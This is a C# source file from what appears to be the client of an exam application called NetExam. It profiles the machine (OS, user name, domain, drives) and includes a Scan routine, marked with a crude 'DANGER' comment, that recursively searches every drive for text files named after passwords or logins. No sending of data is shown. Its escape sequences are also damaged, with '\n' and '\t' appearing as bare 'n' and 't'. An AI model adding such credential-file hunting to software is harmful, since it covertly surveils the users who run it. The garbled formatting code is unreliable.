using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NetExam_Client
{
    public static class PC
    {
        public static Form1 form = null;
        public static string GetSystemInformation()
        {
            StringBuilder systemInfo = new StringBuilder(string.Empty);

            systemInfo.AppendFormat("Operation System:  {0}n", Environment.OSVersion);
            systemInfo.AppendFormat("Processor Architecture:  {0}n", Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
            systemInfo.AppendFormat("Processor Model:  {0}n", Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"));
            systemInfo.AppendFormat("Processor Level:  {0}n", Environment.GetEnvironmentVariable("PROCESSOR_LEVEL"));
            systemInfo.AppendFormat("SystemDirectory:  {0}n", Environment.SystemDirectory);
            systemInfo.AppendFormat("ProcessorCount:  {0}n", Environment.ProcessorCount);
            systemInfo.AppendFormat("UserDomainName:  {0}n", Environment.UserDomainName);
            systemInfo.AppendFormat("UserName: {0}n", Environment.UserName);
            //Drives
            systemInfo.AppendFormat("LogicalDrives:n");
            foreach (System.IO.DriveInfo DriveInfo1 in System.IO.DriveInfo.GetDrives())
            {
                try
                {
                    systemInfo.AppendFormat("t Drive: {0}ntt VolumeLabel: " +
                        "{1}ntt DriveType: {2}ntt DriveFormat: {3}ntt " +
                        "TotalSize: {4}ntt AvailableFreeSpace: {5}n",
                        DriveInfo1.Name, DriveInfo1.VolumeLabel, DriveInfo1.DriveType,
                        DriveInfo1.DriveFormat, DriveInfo1.TotalSize, DriveInfo1.AvailableFreeSpace);
                }
                catch
                {
                }
            }
            systemInfo.AppendFormat("Version:  {0}", Environment.Version);
            return systemInfo.ToString();
        }

        //    DANGER !!! DON'T USE THIS SHIT !!!
        public static string[] Scan()
        {
            string[] drives = Directory.GetLogicalDrives();
            List<string> important = new List<string>();
            foreach (string drive in drives)
            {
                foreach(string file in ScanFolder(drive))
                {
                    important.Add(file);
                }
            }
            return important.ToArray();
        }
        private static string[] ScanFolder(string path)
        {
            List<string> important = new List<string>(); 
            string[] folders = Directory.GetDirectories(path);
            string[] files = Directory.GetFiles(path);
            foreach (string file in files)
            {
                if (file.Contains(".txt") && (file.Contains("password") || file.Contains("login")))
                {
                    important.Add(file);
                }
            }
            foreach (string folder in folders)
            {
                if (folder == "C:\\Windows\\servicing\\LCU") continue;
                form?.Log(folder);
                try
                {
                    foreach(string file in ScanFolder(folder))
                    {
                        important.Add(file);
                    }
                }
                catch (Exception) { }
            }
            return important.ToArray();
        }
    }
}
